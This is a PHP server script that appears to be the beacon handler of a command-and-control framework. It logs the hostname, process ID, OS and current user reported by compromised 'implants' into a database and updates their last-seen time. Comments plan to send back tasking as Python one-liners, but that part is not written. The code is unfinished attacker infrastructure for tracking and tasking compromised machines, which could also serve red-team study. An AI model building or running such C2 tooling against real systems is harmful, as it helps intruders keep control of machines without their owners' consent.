<?php
    include "connector.php";

    # JSON decodes implant POST data
    $post_data = json_decode(file_get_contents("php://input"), true);
    $hostname = $post_data["hostname"];
    $process_id = $post_data["process_id"];
    $os = $post_data["os"];
    $current_user = $post_data["current_user"];

    # Gets current time in UTC (will be used for updating "Last Seen")
    $current_time = gmdate("Y-m-d H:i:s");

    # SQL statement to determine if this is a new or old beaconing host
    $statement = $database_connection->prepare("SELECT * FROM `implants` WHERE `hostname` = :hostname AND `process_id` = :process_id");
    $statement->bindValue(":hostname", $hostname);
    $statement->bindValue(":process_id", $process_id);
    $statement->execute();
    $row_count = $statement->rowCount();

    # If new host
    if ($row_count == "0") {
        echo "new host"; # DEBUGGING

        # Inserts entry into "implants" table
        $statement = $database_connection->prepare("INSERT INTO `implants` (`hostname`, `process_id`, `os`, `current_user`, `last_seen`) VALUES (:hostname, :process_id, :os, :current_user, :last_seen)");
        $statement->bindValue(":hostname", $hostname);
        $statement->bindValue(":process_id", $process_id);
        $statement->bindValue(":os", $os);
        $statement->bindValue(":current_user", $current_user);
        $statement->bindValue(":last_seen", $current_time);
        $statement->execute();
    }
    # Else old host
    else {
        echo "old host"; # DEBUGGING

        # TO DO: If old host, check for tasking

        # Updates "Last Seen" for the host
        $statement = $database_connection->prepare("UPDATE `implants` SET `last_seen` = :last_seen WHERE `hostname` = :hostname AND `process_id` = :process_id");
        $statement->bindValue(":last_seen", $current_time);
        $statement->bindValue(":hostname", $hostname);
        $statement->bindValue(":process_id", $process_id);
        $statement->execute();

        # TO DO: If tasking found, echo appropriate Python one-liner code to do the task here
    }

    # Kills database connection
    $statement->connection = null;
?>
